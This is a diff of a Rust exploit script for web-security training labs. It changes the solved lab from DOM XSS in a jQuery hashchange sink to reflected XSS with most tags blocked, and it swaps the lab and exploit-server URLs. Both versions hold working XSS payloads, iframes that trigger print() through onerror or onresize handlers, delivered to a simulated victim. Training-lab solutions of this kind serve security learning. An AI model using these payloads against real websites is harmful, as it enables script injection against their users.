@@ -2,12 +2,12 @@
 *
 * Author: Ahmed Elqalaawy (@elqal3awii)
 *
-* Date: 15/11/2023
+* Date: 21/11/2023
 *
-* Lab: DOM XSS in jQuery selector sink using a hashchange event
+* Lab: Reflected XSS into HTML context with most tags and attributes blocked
 *
-* Steps: 1. Craft an iframe that, when loaded, will append an img element to the hash part
-*           of the URL
+* Steps: 1. Craft an iframe that, when loaded, will change the body width, causing the 
+*           onresize event handler to be invoked
 *        2. Deliver the exploit to the victim
 *        3. The print() function will be called after they trigger the exploit
 *
@@ -33,10 +33,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0a8200e004c5761d8382b63b00510046.web-security-academy.net";
+    let lab_url = "https://0a02000b04e2d4618122b66f00020010.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0a4b0000045476338315b560012f006c.exploit-server.net";
+    let exploit_server_url = "https://exploit-0aac004c040bd492819cb502019700fb.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -46,7 +46,7 @@ fn main() {
 
     // payload to call the print() function
     let payload = format!(
-        r###"<iframe src="{lab_url}/#" onload="this.src+='<img src=1 onerror=print()>'">"###
+        r###"<iframe src="{lab_url}/?search=<body onresize=print()>" onload=this.style.width='100px'>"###
     );
 
     print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
